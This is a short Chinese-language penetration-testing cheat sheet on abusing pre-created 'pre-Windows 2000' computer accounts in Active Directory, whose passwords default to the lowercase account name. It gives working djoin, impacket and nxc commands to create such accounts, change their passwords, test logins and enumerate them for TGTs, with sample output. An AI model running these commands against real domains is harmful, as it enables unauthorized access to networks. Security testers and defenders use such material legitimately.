# 密码 - 预创建的计算机帐户 (Pre-Created Computer Account)

当勾选 `Assign this computer account as a pre-Windows 2000 computer` (将此计算机帐户分配为 Windows 2000 之前的计算机) 时，计算机帐户的密码将变为与计算机帐户名相同的小写字母。例如，计算机帐户 **SERVERDEMO$** 的密码将是 **serverdemo**。

```ps1
# 创建具有默认密码的机器
# 必须连接到域且从已加入域的设备上运行
djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

* 当你尝试使用该凭据登录时，应会出现以下错误代码：`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`。
* 然后你需要使用 [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304) 更改密码

    ```ps1
    python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
    ```

:warning: 当机器帐户名和密码相同时，该机器也会像 Windows 2000 之前的计算机一样运行，身份验证将导致 `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`。

```ps1
$ impacket-addcomputer -dc-ip 10.10.10.10 EXODIA.LOCAL/Administrator:P@ssw0rd -computer-name swkserver -computer-pass swkserver
[*] Successfully added machine account swkserver$ with password swkserver.

$ nxc smb 10.10.10.10 -u 'swkserver$' -p swkserver    
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-8OJFTLMU1IG) (domain:EXODIA.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [-] EXODIA.LOCAL\swkserver$:swkserver STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

## 枚举预创建的计算机帐户 (Enumerate Pre-Created Computer Account)

识别预先创建的计算机帐户，将结果保存到文件中，并获取每个帐户的 TGT。

```ps1
nxc -u username -p password -M pre2K
```

## 参考资料 (References)

* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
